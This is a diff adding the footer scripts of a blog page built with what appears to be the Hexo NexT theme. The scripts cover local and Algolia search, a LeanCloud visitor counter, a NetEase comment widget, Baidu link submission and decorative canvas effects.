+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+    
+    <script>
+      var cloudTieConfig = {
+        url: document.location.href, 
+        sourceId: "",
+        productKey: "70c8d4b1771e4a19bf986d2a1c098b34",
+        target: "cloud-tie-wrapper"
+      };
+    </script>
+    <script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/algolia-instant-search/instantsearch.min.css">
+
+  
+  
+  <script src="/lib/algolia-instant-search/instantsearch.min.js"></script>
+  
+
+  <script src="/js/src/algolia-search.js?v=5.1.0"></script>
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("YQEVdCwfMShMt1vjaRojsYrr-gzGzoHsz", "APOpeTkajaCsoqVKYvcCMWwt");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+  
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+</body>
+</html>
